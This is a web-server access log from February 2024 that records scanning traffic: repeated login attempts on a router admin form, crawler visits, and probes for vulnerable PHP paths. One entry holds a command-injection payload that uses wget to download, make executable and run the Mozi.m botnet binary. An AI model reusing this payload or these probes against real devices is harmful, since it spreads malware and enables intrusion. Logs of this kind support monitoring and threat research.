94.156.66.21 - - [01/Feb/2024:07:45:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:07:45:22 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:07:49:12 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:07:49:12 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:07:55:09 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:07:55:09 +0000] "" 400 0 "-" "-"
66.249.69.36 - - [01/Feb/2024:07:58:35 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.36 - - [01/Feb/2024:07:58:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.156.66.21 - - [01/Feb/2024:07:59:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:07:59:50 +0000] "" 400 0 "-" "-"
179.67.117.105 - - [01/Feb/2024:07:59:54 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
141.98.11.201 - - [01/Feb/2024:08:01:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [01/Feb/2024:08:04:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:08:04:38 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:08:06:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:08:06:50 +0000] "" 400 0 "-" "-"
89.104.100.255 - - [01/Feb/2024:08:12:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
45.90.61.228 - - [01/Feb/2024:08:12:32 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.237.97.239 - - [01/Feb/2024:08:12:42 +0000] "GET //vendor/phpunit/phpunit/phpunit.xsd HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
94.156.66.229 - - [01/Feb/2024:08:14:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:08:14:31 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:08:19:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:08:19:25 +0000] "" 400 0 "-" "-"
139.59.84.126 - - [01/Feb/2024:08:21:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
94.156.66.229 - - [01/Feb/2024:08:23:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:08:23:43 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:08:29:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:08:29:39 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:08:34:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:08:34:34 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:08:40:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:08:40:27 +0000] "" 400 0 "-" "-"
66.249.69.35 - - [01/Feb/2024:08:43:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.156.66.229 - - [01/Feb/2024:08:45:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:08:45:03 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:08:48:15 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:08:48:15 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:08:54:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:08:54:07 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:08:55:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:08:55:42 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:09:06:56 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:09:06:57 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:09:10:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:09:10:25 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:09:17:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:09:17:39 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:09:26:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:09:26:41 +0000] "" 400 0 "-" "-"
66.249.77.99 - - [01/Feb/2024:09:27:36 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.77.98 - - [01/Feb/2024:09:27:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.156.66.229 - - [01/Feb/2024:09:27:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:09:27:54 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:09:34:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:09:34:42 +0000] "" 400 0 "-" "-"
185.224.128.179 - - [01/Feb/2024:09:35:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.156.66.21 - - [01/Feb/2024:09:39:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:09:39:04 +0000] "" 400 0 "-" "-"
184.105.247.254 - - [01/Feb/2024:09:42:21 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA4\x7F\x7Ff\xC6\x13\xE0x\x9B\xC8\xB0\x5CW\x1C$-\xC8\x18OX\xF9\xF2\x94\xBB\xAD\xD7\xB1\xC8V\xB7\xD4\xF7\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
94.156.66.229 - - [01/Feb/2024:09:44:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:09:44:08 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:09:54:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:09:54:37 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:09:56:35 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:09:56:35 +0000] "" 400 0 "-" "-"
94.102.61.10 - - [01/Feb/2024:09:59:56 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.26.0"
94.156.66.229 - - [01/Feb/2024:10:04:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:10:04:30 +0000] "" 400 0 "-" "-"
162.142.125.10 - - [01/Feb/2024:10:06:52 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
162.142.125.10 - - [01/Feb/2024:10:06:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.10 - - [01/Feb/2024:10:06:57 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
94.156.66.229 - - [01/Feb/2024:10:14:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:10:14:25 +0000] "" 400 0 "-" "-"
139.190.224.98 - - [01/Feb/2024:10:15:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3"
94.156.66.21 - - [01/Feb/2024:10:19:48 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:10:19:48 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:10:24:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:10:24:47 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:10:31:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:10:31:21 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:10:35:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:10:35:27 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:10:40:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:10:40:33 +0000] "" 400 0 "-" "-"
13.40.152.213 - - [01/Feb/2024:10:43:12 +0000] "Ph\xD8\x8E\xF6\xCB\xDE\xA3`\x18\x04\xB05.\x00\x00\x02\x04\x05\xB4" 400 154 "-" "-"
94.156.66.229 - - [01/Feb/2024:10:44:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:10:44:31 +0000] "" 400 0 "-" "-"
13.40.152.213 - - [01/Feb/2024:10:47:13 +0000] "h\x99`\xEC\xA4\xD7\x07\xC9`\x18\x04\xB0n\xEA\x00\x00\x02\x04\x05\xB4" 400 154 "-" "-"
94.156.66.21 - - [01/Feb/2024:10:50:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:10:50:45 +0000] "" 400 0 "-" "-"
87.98.140.71 - - [01/Feb/2024:10:50:57 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
94.156.66.229 - - [01/Feb/2024:10:54:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:10:54:13 +0000] "" 400 0 "-" "-"
66.249.77.96 - - [01/Feb/2024:10:57:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.156.66.21 - - [01/Feb/2024:10:58:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:10:58:34 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:11:04:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:11:04:29 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:11:07:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:11:07:28 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:11:14:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:11:14:33 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:11:17:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:11:17:01 +0000] "" 400 0 "-" "-"
65.49.20.66 - - [01/Feb/2024:11:20:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
65.49.20.66 - - [01/Feb/2024:11:21:17 +0000] "GET /webui/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46"
65.49.20.66 - - [01/Feb/2024:11:21:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46"
65.49.20.66 - - [01/Feb/2024:11:22:24 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
194.38.23.16 - - [01/Feb/2024:11:22:46 +0000] "GET /sites/all/libraries/elfinder/src/connectors/php/connector.php HTTP/1.1" 301 166 "-" "ALittle Client"
194.38.23.16 - - [01/Feb/2024:11:22:46 +0000] "GET /sites/all/libraries/elfinder/connectors/php/connector.php HTTP/1.1" 301 166 "-" "ALittle Client"
194.38.23.16 - - [01/Feb/2024:11:22:49 +0000] "GET /sites/all/libraries/elfinder/elfinder.html HTTP/1.1" 301 166 "-" "ALittle Client"
65.49.20.66 - - [01/Feb/2024:11:23:00 +0000] "GET /geoserver/web/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
94.156.66.229 - - [01/Feb/2024:11:28:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:11:28:01 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:11:28:12 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:11:28:12 +0000] "" 400 0 "-" "-"
58.53.218.148 - - [01/Feb/2024:11:32:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
94.156.66.229 - - [01/Feb/2024:11:33:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:11:33:58 +0000] "" 400 0 "-" "-"
122.96.31.142 - - [01/Feb/2024:11:36:04 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 154 "-" "-"
94.156.66.21 - - [01/Feb/2024:11:38:14 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:11:38:14 +0000] "" 400 0 "-" "-"
154.73.17.144 - - [01/Feb/2024:11:41:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
45.79.74.34 - - [01/Feb/2024:11:44:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
45.79.74.34 - - [01/Feb/2024:11:44:43 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:11:46:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:11:46:03 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:11:46:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:11:46:57 +0000] "" 400 0 "-" "-"
34.140.248.32 - - [01/Feb/2024:11:50:24 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.31.0"
94.156.66.229 - - [01/Feb/2024:11:54:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:11:54:26 +0000] "" 400 0 "-" "-"
223.113.128.199 - - [01/Feb/2024:12:01:34 +0000] "\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xD39p\xD4\xCC\xA7g\xE9\xB9+\xC2'\xCC]\xEC\xC5\xD7\xE4\x021)\xA4nb\x89\xFA" 400 154 "-" "-"
223.113.128.199 - - [01/Feb/2024:12:01:35 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE7\xA0\x8D\xC2\xAC\xCBd\xA9\x84\xED\x5Cl\x86\xCF<\x040\x9B\xD9EA\xD0\xAF\xBF9^\xCDB{\x80\x00\xA9 \xC0z[\x9FX\xD3J\xF2.|,\xCD\x9A\x97\xA7\x11VU\x17@\xB3\xCB\xA1\x1A\xFB\xFC\x09h\x10\x00*%\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
223.113.128.199 - - [01/Feb/2024:12:01:36 +0000] "t3 12.1.2" 400 154 "-" "-"
94.156.66.21 - - [01/Feb/2024:12:01:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:12:01:52 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:12:05:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:12:05:42 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:12:07:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:12:07:51 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:12:14:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:12:14:44 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:12:19:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:12:19:02 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:12:27:16 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:12:27:16 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:12:29:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:12:29:08 +0000] "" 400 0 "-" "-"
45.128.232.215 - - [01/Feb/2024:12:33:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.215 - - [01/Feb/2024:12:33:45 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:12:34:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:12:34:20 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:12:37:52 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:12:37:52 +0000] "" 400 0 "-" "-"
